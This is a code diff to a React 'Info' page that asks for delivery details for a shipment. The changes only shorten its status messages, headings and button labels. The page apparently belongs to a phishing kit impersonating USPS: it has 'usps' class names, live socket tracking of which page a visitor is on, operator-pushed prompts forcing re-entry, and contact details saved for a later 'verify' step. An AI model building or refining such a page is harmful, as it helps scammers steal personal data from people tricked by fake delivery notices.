@@ -73,7 +73,7 @@ export default function Info() {
   const navigate = useNavigate();
 
   const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
-  const [status, setStatus] = useState('Enter the delivery information associated with this shipment.');
+  const [status, setStatus] = useState('Enter the delivery information for this shipment.');
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});
 
@@ -83,7 +83,7 @@ export default function Info() {
   useEffect(() => {
     socket.emit('join-page', 'info');
     const hasDraft = Object.values(form).some((v) => v.trim());
-    setStatus(hasDraft ? 'Your saved details were restored.' : 'Enter the delivery information associated with this shipment.');
+    setStatus(hasDraft ? 'Saved details restored.' : 'Enter the delivery information for this shipment.');
   }, []);
 
   useEffect(() => {
@@ -110,7 +110,7 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details for this shipment.');
+      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details.');
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -188,7 +188,7 @@ export default function Info() {
     }
 
     setLoading(true);
-    setStatus('Saving your shipping details...');
+    setStatus('Saving your details...');
     clearDraft(STORAGE_KEYS.infoDraft);
     saveDraft(STORAGE_KEYS.verifyContact, {
       telephone: form.telephone.trim(),
@@ -212,8 +212,8 @@ export default function Info() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm the delivery address for this shipment</h1>
-              <p className="alz-step-subtitle">Review the recipient and mailing details before delivery processing resumes.</p>
+              <h1 className="alz-step-title">Confirm the delivery address</h1>
+              <p className="alz-step-subtitle">Review the recipient and mailing details.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -224,7 +224,7 @@ export default function Info() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Delivery details</div>
-            <h2 className="alz-page-title">Review your mailing information</h2>
+            <h2 className="alz-page-title">Review your mailing info</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
@@ -285,10 +285,10 @@ export default function Info() {
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? 'Saving...' : 'Continue with address review'}
+                {loading ? 'Saving...' : 'Continue'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                You may be asked to reconfirm these details if the shipment record changes.
+                You may be asked to reconfirm these details later.
               </p>
             </form>
 
@@ -301,14 +301,14 @@ export default function Info() {
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">Review the address currently on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details associated with this shipment.</div>
+                <div className="alz-order-mini-title">Review the address on file</div>
+                <div className="alz-order-mini-copy">Confirm the recipient name, address, ZIP Code, and contact details.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
               <div>Recipient name exactly as entered</div>
               <div>Street address, city, state, and ZIP Code</div>
-              <div>Phone number and email for delivery updates</div>
+              <div>Phone number and email</div>
             </div>
             <div className="alz-side-summary-box">Use the mailing information tied to this shipment so delivery can resume.</div>
           </aside>
